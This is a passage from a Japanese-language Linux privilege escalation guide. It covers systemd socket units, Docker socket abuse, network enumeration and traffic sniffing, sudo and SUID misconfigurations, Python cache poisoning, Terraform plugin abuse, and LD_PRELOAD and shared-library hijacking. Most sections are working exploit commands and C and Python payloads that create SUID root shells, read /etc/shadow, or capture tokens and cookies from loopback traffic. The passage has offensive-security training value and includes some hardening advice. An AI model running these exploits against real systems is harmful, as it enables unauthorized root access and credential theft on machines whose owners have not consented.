- `Service`: **incoming traffic**時に**activateする** **service** unit nameを指定します。このsettingは`Accept=no`のsocketsでのみ許可されます。デフォルトでは、socketと同じname（suffixは置き換えられます）を持つserviceになります。ほとんどの場合、このoptionを使用する必要はありません。

### Writable .socket files

**writable**な`.socket` fileを見つけた場合、`[Socket]` sectionの先頭に`ExecStartPre=/home/kali/sys/backdoor`のようなものを**add**でき、socketがcreatedされる前にbackdoorが実行されます。そのため、**machineがrebootされるまで待つ必要がある可能性が高いです。**\
_systemはそのsocket file configurationを使用していなければならず、そうでない場合backdoorは実行されない点に注意してください_

### Socket activation + writable unit path (create missing service)

もう1つの影響度の高いmisconfigurationは次のとおりです。

- `Accept=no`および`Service=<name>.service`を持つsocket unit
- 参照されているservice unitが存在しない
- attackerが`/etc/systemd/system`（または別のunit search path）へwriteできる

この場合、attackerは`<name>.service`をcreateし、その後socketへのtrafficをtriggerすることで、systemdに新しいserviceをloadさせ、rootとしてexecuteさせることができます。

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 書き込み可能なソケット

**書き込み可能なソケット**（_ここで言っているのは Unix Sockets であり、設定用の `.socket` ファイルではありません_）を**特定した場合、そのソケットと通信でき、脆弱性を exploit できる可能性があります。**

### Unix Sockets の列挙
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation の例:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP ソケット

**HTTP** リクエストを待ち受けている**ソケット**が存在する場合があります（_ここで言っているのは .socket ファイルではなく、Unix ソケットとして機能するファイルです_）。以下のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
ソケットが **HTTP** リクエストに**応答**する場合、そのソケットと**通信**でき、場合によっては**脆弱性を exploit** できます。

### Writable Docker Socket

Docker socket は、多くの場合 `/var/run/docker.sock` にあり、適切に保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権を持つと、privilege escalation につながる可能性があります。ここでは、その方法と、Docker CLI が利用できない場合の代替手法について説明します。

#### **Privilege Escalation with Docker CLI**

Docker socket への書き込みアクセス権がある場合、次のコマンドを使用して privilege escalation を実行できます。<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使用すると、ホストのファイルシステムに root-level access でアクセスできるコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIを利用できない場合でも、Unix socket上で raw HTTP を使用すれば、Docker socketを悪用できます。最も信頼性の高い手順は次のとおりです。

- ホストの root を bind-mount した、長時間実行する helper container を作成する
- それを起動する
- その helper 内に `exec` instance を作成する
- `exec` instance を起動し、API経由で出力を読み取る

**Dockerイメージを一覧表示する**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**ヘルパーコンテナを作成して起動する**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**exec instance を作成する**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**exec instanceを起動して出力を読み取る**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
このパターンは、`attach` を `socat` や `nc -U` で手動操作しようとするより、通常は堅牢です。`/:/host` を使って helper を作成できれば、追加の `exec` インスタンスを使用して `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、host の startup files を変更したりできます。

### Others

**group `docker` の内部にいる**ため docker socket に対する write permissions がある場合、[**privileges を escalate するためのより多くの方法**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)があります。[**docker API が port で listening している**場合](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)、それを compromise できる可能性もあります。

**containers から break out したり、container runtimes を abuse して privileges を escalate したりする方法**については、以下を確認してください:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

**`ctr`** command を使用できることが分かった場合、**それを abuse して privileges を escalate できる可能性がある**ため、以下のページを読んでください:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

**`runc`** command を使用できることが分かった場合、**それを abuse して privileges を escalate できる可能性がある**ため、以下のページを読んでください:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、application が効率的に相互作用し、data を共有できるようにする高度な **inter-Process Communication (IPC) system** です。modern Linux system を念頭に設計されており、さまざまな形式の application communication に対応する堅牢な framework を提供します。<sup>[[16]](#references)</sup>

この system は versatile で、process 間の data exchange を強化する基本的な IPC をサポートしており、**enhanced UNIX domain sockets** を想起させます。さらに、events や signals の broadcast にも対応し、system components 間の seamless な integration を促進します。たとえば、incoming call を知らせる Bluetooth daemon からの signal によって music player が mute され、user experience が向上します。また、D-Bus は remote object system にも対応しており、application 間の service requests や method invocations を簡素化します。これにより、従来は複雑だった processes が streamlined されます。

D-Bus は **allow/deny model** で動作し、matching policy rules の累積的な効果に基づいて message permissions（method calls、signal emissions など）を管理します。これらの policies は bus との interaction を指定し、permissions の exploit による privilege escalation を可能にする場合があります。

このような policy の例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` に記載されたものがあります。これは、root user が `fi.w1.wpa_supplicant1` の messages を own、send、receive するための permissions を詳しく定義しています。

user や group が指定されていない policies は universal に適用されます。一方、"default" context policies は、他の specific policies によって covered されていないすべての対象に適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication の enumerate と exploit の方法：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Network を常に enumerate して、マシンの位置を把握するのは興味深いことです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering quick triage

ホスト上でコマンドを実行できるが callback に失敗する場合は、DNS、transport、proxy、route filtering のどれが原因かを迅速に切り分けます：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

マシンにアクセスする前に、以前は操作できなかった、マシン上で稼働しているネットワークサービスを必ず確認します。
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
リスナーを bind target で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されます。
- `127.0.0.1` / `::1`: local-only（tunnel/forward の候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常は内部セグメントからのみ到達可能です。

### Local-only service triage workflow

host を compromise すると、`127.0.0.1` に bind されたサービスが、初めて shell から到達可能になることがよくあります。簡単な local workflow は次のとおりです。
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### ネットワークスキャナーとしての LinPEAS（network-only mode）

ローカルの PE チェックに加えて、linPEAS は特化型のネットワークスキャナーとして実行できます。`$PATH` にあるバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールすることはありません。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` なしで `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋な network scanner として動作します（それ以外の privilege-escalation checks はスキップされます）。

### Sniffing

traffic を sniff できるか確認します。可能であれば、認証情報を取得できる可能性があります。
```
timeout 1 tcpdump
```
手早い実践的な確認:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback（`lo`）は、内部専用サービスがそこで token/cookie/credential を公開していることが多いため、post-exploitation において特に価値があります:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
今キャプチャし、後で解析する：
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## ユーザー

### Generic Enumeration

自分が**誰**なのか、どのような**権限**を持っているのか、システムに**どのユーザー**が存在するのか、どのユーザーが**login**でき、どのユーザーが**root privileges**を持っているのかを確認します：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できる bug の影響を受けていました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

root 権限を与える可能性のある**グループのメンバー**になっていないか確認します:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

可能であれば、クリップボード内に興味深いものがないか確認します
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境内の**いずれかのパスワードを知っている**場合は、そのパスワードを使って**各ユーザーとしてログイン**してみてください。

### Su Brute

大量のノイズが発生しても気にせず、コンピューター上に `su` と `timeout` バイナリが存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーを brute-force してみることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` パラメーターを指定するとユーザーの brute-force を試みます。

## Writable PATH abuses

### $PATH

**$PATH 内のいずれかのフォルダーに書き込み可能**であることがわかった場合、**書き込み可能なフォルダー内に backdoor を作成**することで privilege escalation が可能になる場合があります。その際、別のユーザー（理想的には root）によって実行される command と同じ名前を付け、その command が **$PATH 内で書き込み可能なフォルダーより前にあるフォルダーから読み込まれない**ようにします。

### SUDO and SUID

sudo を使って command を実行できる場合や、suid bit が設定されている場合があります。次のコマンドで確認してください。
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**想定外のコマンドでは、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能です。**<sup>[[8]](#references)</sup> 例:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーはパスワードを知らなくても、別のユーザーの権限で一部のコマンドを実行できる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `vim` を `root` として実行できるため、root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで簡単にシェルを取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブを使用すると、ユーザーは何かを実行する際に**環境変数を設定**できます:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer** に基づいており、root として script を実行する際に任意の Python library を読み込む **PYTHONPATH hijacking** に対して **脆弱** でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports における書き込み可能な `__pycache__` / `.pyc` poisoning

**sudo-allowed Python script** が、package directory 内に**書き込み可能な `__pycache__`**を含む module を import している場合、cached `.pyc` を置き換え、次回の import 時に privileged user として code execution を取得できる可能性があります。<sup>[[30]](#references)</sup>

- 動作する理由:
- CPython は bytecode cache を `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
- interpreter は **header**（magic + source に関連付けられた timestamp/hash metadata）を検証し、その後、その header の後に格納された marshaled code object を実行します。
- directory が writable で cached file を**削除して再作成**できる場合、root-owned で non-writable な `.pyc` でも置き換えることができます。
- 典型的な path:
- `sudo -l` に、root として実行可能な Python script または wrapper が表示される。
- その script が `/opt/app/`、`/usr/local/lib/...` などから local module を import する。
- imported module の `__pycache__` directory が user または全員によって writable になっている。

簡易 enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
特権スクリプトを検査できる場合は、インポートされたモジュールとそのキャッシュパスを特定します:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
悪用ワークフロー:

1. sudo-allowed script を一度実行し、正規の cache file がまだ存在しない場合は Python に作成させる。
2. 正規の `.pyc` から最初の 16 バイトを読み取り、poisoned file で再利用する。
3. payload code object をコンパイルして `marshal.dumps(...)` でシリアライズし、元の cache file を削除して、元の header と悪意のある bytecode を結合した内容で再作成する。
4. sudo-allowed script を再実行し、import によって root として payload を実行させる。

重要な注意事項:

- 元の header を再利用することが重要です。Python は bytecode の本体が source と本当に一致するかではなく、cache metadata と source file の整合性をチェックするためです。
- これは、source file が root-owned で書き込み不可でも、格納先の `__pycache__` directory が書き込み可能な場合に特に有効です。
- 特権プロセスが `PYTHONDONTWRITEBYTECODE=1` を使用している場合、permissions が安全な場所から import している場合、または import path 内のすべての directory への書き込みアクセスを削除している場合、attack は失敗します。

最小限の proof-of-concept の形状:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- `__pycache__` を含め、privileged な Python import path 内のディレクトリが low-privileged users によって書き込み可能でないことを確認する。
- privileged な実行では、`PYTHONDONTWRITEBYTECODE=1` の使用と、予期しない書き込み可能な `__pycache__` ディレクトリの定期的なチェックを検討する。
- 書き込み可能なローカル Python modules や書き込み可能な cache directories は、root によって実行される書き込み可能な shell scripts や shared libraries と同じように扱う。

### sudo env_keep によって保持された BASH_ENV → root shell

sudoers が `BASH_ENV` を保持する場合（例：`Defaults env_keep+="ENV BASH_ENV"`）、Bash の non-interactive startup behavior を利用して、許可された command の実行時に root として arbitrary code を実行できる。<sup>[[24]](#references)</sup>

- 仕組み：non-interactive shells の場合、Bash は target script を実行する前に `$BASH_ENV` を評価し、その file を source する。多くの sudo rules では、script または shell wrapper の実行が許可されている。`BASH_ENV` が sudo によって保持される場合、指定した file は root privileges で source される。<sup>[[23]](#references)</sup>

- Requirements:
- 実行可能な sudo rule（`/bin/bash` を non-interactively invoke する任意の target、または任意の bash script）。
- `env_keep` に `BASH_ENV` が存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を優先する。
- sudo で許可するコマンドに shell wrapper を使用せず、最小限のバイナリを使用する。
- 環境変数が保持された状態で使用された場合に備え、sudo の I/O logging と alerting を検討する。

### sudo 経由の Terraform（!env_reset）

sudo が環境をそのまま保持する（`!env_reset`）一方で `terraform apply` を許可している場合、`$HOME` は呼び出し元ユーザーのままになる。そのため Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を適用する。<sup>[[25]](#references)</sup>

- 必要な provider を書き込み可能なディレクトリに指定し、provider 名（例：`terraform-provider-examples`）の名前を付けた悪意のある plugin を配置する：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、停止する前に payload を root として実行するため、SUID shell が残ります。

### TF_VAR overrides + symlink validation bypass

Terraform の変数は `TF_VAR_<name>` 環境変数を介して指定できます。これらは sudo が環境変数を保持すると、そのまま残ります。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような脆弱な検証は、symlink を使って bypass できます。<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraformはシンボリックリンクを解決し、実体である`/root/root.txt`を攻撃者が読み取り可能な宛先へコピーします。同じ方法で、宛先のシンボリックリンクをあらかじめ作成しておけば、特権パスへ**書き込む**こともできます（例：providerの宛先パスを`/etc/cron.d/`内に向ける）。

### requiretty / !requiretty

一部の古いディストリビューションでは、sudoに`requiretty`を設定し、インタラクティブなTTYからのみsudoを実行できるようにする場合があります。`!requiretty`が設定されている場合（またはこのオプションが存在しない場合）、reverse shell、cronジョブ、スクリプトなどの非対話的なコンテキストからsudoを実行できます。
```bash
Defaults !requiretty
```
これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY を必要とせずに sudo ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示される場合、または攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が設定されている場合、sudo で許可された対象内にある相対パスのコマンドを影響下に置くことができます。<sup>[[3]](#references)</sup>

- 要件: 絶対パスを指定せずにコマンド（`free`、`df`、`ps` など）を呼び出す script/binary を実行する sudo ルール（多くの場合 `NOPASSWD`）と、検索順序が先で、書き込み可能な PATH エントリ。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudoでパス制限を回避して実行
**Jump**して他のファイルを読み込むか、**symlinks**を使用します。例えばsudoersファイルでは、_hacker10 ALL= (root) /bin/less /var/log/\*_】【。
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**ワイルドカード**が使用されている場合（\*）、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスがない Sudo command/SUID binary

**sudo permission** が単一の command に対して**パスを指定せずに**与えられている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで exploit できます
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この技法は、**suid** バイナリがパスを指定せずに別のコマンドを**実行する場合にも使用できます（常に _**strings**_ で奇妙な SUID バイナリの内容を確認してください）。

[実行する Payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID バイナリとコマンドパス

**suid** バイナリが**パスを指定して別のコマンドを実行する場合**は、suid ファイルが呼び出しているコマンドと同じ名前の**関数をエクスポート**してみてください。

たとえば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合は、関数を作成してエクスポートしてみる必要があります。
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
次に、SUID binary を呼び出すと、この function が実行されます

### SUID wrapper によって実行される書き込み可能な script

一般的な custom-app の設定ミスは、root 所有の SUID binary wrapper が script を実行する一方で、その script 自体が低権限ユーザーによって書き込み可能になっている状態です。

典型的なパターン:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` が書き込み可能な場合、payload commands を追加してから SUID wrapper を実行できます。
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
簡単な確認:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
この攻撃経路は、`/usr/local/bin` に配置されている「maintenance」/「backup」wrapper で特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより先に loader によって読み込まれる、1 つ以上の shared libraries（.so files）を指定するために使用されます。このプロセスは、library の preloading と呼ばれます。

ただし、system security を維持し、この機能が悪用されるのを防ぐため、特に **suid/sgid** executable に対して、system は特定の条件を適用します。

- real user ID（_ruid_）が effective user ID（_euid_）と一致しない executable では、loader は **LD_PRELOAD** を無視します。
- suid/sgid の executable では、standard paths 内にあり、かつ suid/sgid でもある library のみが preload されます。

`sudo` を使用して commands を実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、Privilege escalation が発生する可能性があります。この設定により、`sudo` で commands を実行した場合でも **LD_PRELOAD** 環境変数が維持されて認識されるため、結果として elevated privileges で arbitrary code が実行される可能性があります。<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存する
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile**します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行します。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御している場合も、同様の privesc を悪用できます。これは、ライブラリの検索先となるパスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** 権限を持つバイナリで、通常とは異なる動作をするものに遭遇した場合、**.so** ファイルが適切にロードされているか確認するのがよい方法です。これは、次のコマンドを実行して確認できます:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_「open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)」_ のようなエラーに遭遇した場合、exploit の可能性が示唆されます。

これを exploit するには、まず _"/path/to/.config/libcalc.c"_ などの C ファイルを作成し、そこに以下のコードを記述します。
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限で shell を実行することで privilege escalation を行います。

次のコマンドで、上記の C file を shared object (.so) file にコンパイルします：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受ける SUID binary を実行すると exploit が発動し、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダから library をロードしている SUID binary が見つかったので、そのフォルダに必要な名前で library を作成しましょう。
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが表示された場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成した library には `a_function_name` という名前の function が必要です。

### GTFOBins

